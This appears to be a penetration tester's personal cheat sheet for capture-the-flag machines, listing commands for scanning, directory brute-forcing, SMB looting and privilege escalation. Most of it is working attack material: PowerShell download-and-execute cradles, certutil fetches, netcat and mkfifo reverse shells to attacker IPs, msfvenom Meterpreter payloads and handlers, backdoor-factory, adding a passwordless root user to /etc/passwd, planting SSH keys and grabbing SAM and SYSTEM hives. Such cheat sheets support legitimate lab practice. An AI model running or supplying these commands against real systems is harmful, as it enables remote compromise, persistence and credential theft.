# scan
masscan -p 0-65535 <RHOST> --rate 1000
nmap -sC -sV -oA <Box_Name> <RHOST>
nmap -sC -sV -o nmap.log <RHOST>


dirb
gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 50 -u http://<RHOST>/ -x .php,.txt,.html,.aspx
gobuster dir -u http://<RHOST> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 50
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -u http://<RHOST>/ -x /usr/share/wordlists/wfuzz/general/extensions_common.txt
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -u http://<RHOST>/ -x .asp,.aspx,.bat,.c,.cfm,.cgi,.com,.dll,.exe,.htm,.html,.inc,.jhtml,.jsa,.jsp,.log,.mdb,.nsf,.php,.phtml,.pl,.reg,.sh,.shtml,.sql,.txt,.xml
wfuzz -c -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w /usr/share/wordlists/wfuzz/general/extensions_common.txt --hc 404 http://[IP]/FUZZFUZ2Z
/dirsearch.py -u http://10.10.10.176/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -e php 


# wordlist
cewl <RHOST>
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

## parameter
/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
/usr/share/wordlists/SecLists/Fuzzing/special-chars.txt

wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt http://<RHOST>/<file>?FUZZ=test

# webshell

## rsa
ssh-keygen -t rsa


# args
``
$()

# ftp
ftp anonymous login
User:  anonymous
Password: anonymous@domain.com
password: anonymous


# wordpress
wpscan -u http://<RHOSTS>/ --enumerate t --enumerate p --enumerate u
wpscan --url http://<RHOSTS>/ --usernames <name> --passwords <wordlists>

# msfvenom
exitfunc=thread

# Windows IIS
asp,aspx,asm,asmx
dirb http://<RHOST> -X .aspx

# smb
smbclient //10.10.10.178/Data -U TempUser
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> recure on
recure: command not found
smb: \> prompt off
smb: \> mget *

# cmd.exe
certutil -urlcache -f http://<LHOST>/file file

# Simple HTTPServer
python -m SimpleHTTPServer 80
default port 8000

# terminal
sh -c /bin/sh
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# ssh
chmod 600 key
ssh i -key -l username

echo "echo ssh-rsa YOURPUBID_RSAKEY root@kali >> /root/.ssh/authorized_keys" > /usr/bin/timer_backup.sh

# flag
user.txt
root.txt

# Windows
C:\Windows\TEMP
C:\Users\
C:\Users\Administrator\Desktop
C:\Documents and Settings\Administrator

Linux
/home/username/user.txt
/root/root.txt


# registry
C:\Windows\System32\Config\SAM
C:\Windows\System32\Config\SYSTEM

# powershell

powershell -c IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>')

powershell -noni -nop -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>');Invoke-AllChecks"
powershell -nop -exec bypass -w hidden "IEX (New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/file', 'C:\Users\user\Documents\file')"


powershell -noni -nop -exec bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.19/PowerUp.ps1');Invoke-AllChecks"
powershell -noni -nop -exec bypass -w Hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.19/PowerUp.ps1');Invoke-AllChecks"


# Privilege escalation
sudo -l
sudo /nopassword
find / -perm -4000 2>/dev/null
https://github.com/DominicBreuker/pspy/releases
http://urfsecurity.info/posts/linuxprivesc/

# keygen
ssh-keygen -b 2048 -t ed25519 -f ./key -q -N ""

# bin reverese shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f" > /bin
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i | nc 10.10.14.72 1337 >/tmp/f

# /etc/passwd
openssl passwd -1
openssl passwd -1 -salt raj pass123
perl -le 'print crypt("password", "aa")'
aajfMKNH1hTm2
echo "aqua:aajfMKNH1hTm2.dU:0:0:root:/root:/bin/bash" >> passwd
echo aqua::0:0:root:/root:/bin/bash >> /etc/passwd


Windows
runas /user:ACCESS\Administrator /savecred "powershell -noni -nop -exec bypass-c "IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')"

## Tool
https://github.com/rebootuser/LinEnum

Linuxprivchecker
find / -group adm 2>/dev/null
find / -type f -perm -4000 2>/dev/null

wget //www.securitysift.com/download/linuxprivchecker.py

git clone //github.com/jondonas/linux-exploit-suggester-2.git

Windows
cacls C:\Users\Administrator
cacls root.txt /grant <username>:F
ICACLS root.txt /grant "Users":F

# msf
use exploit/multi/handler
set ExitOnsession false
exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
meterpreter > run post/multi/recon/local_exploit_suggester SHOWDESCRIPTION=true

# smbserver
sudo python smbserver.py -smb2support control `pwd`
nc.exe -e cmd 10.10.14.14

certutil.exe -urlcache -f http://192.168.119.210/cred.ps1 cred.ps1


# Windows Credencials
$pass = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Fidelity\Hector", $pass)
Invoke-Command -Computer Fidelity -Credential $cred -ScriptBlock { cmd.exe "/c C:\inetpub\wwwroot\nc.exe -e powershell.exe 10.10.15.212 4445" }

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<RHOST> -a x64 -f exe > shell.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -a x64 -f psh > shell.ps1

msfconsole -x "use exploit/multi/handler; set ExitOnsession false; set payload windows/meterpreter/reverse_tcp; set LHOST 10.10.14.19; set LPORT 4444; exploit -j"
set payload windows/meterpreter/reverse_tcp; LHOST 192.168.131.129; LPORT 5555; exploit -j

backdoor-factory -f plink.exe -H 192.168.131.129 -P 6666 -s -s reverse_shell_tcp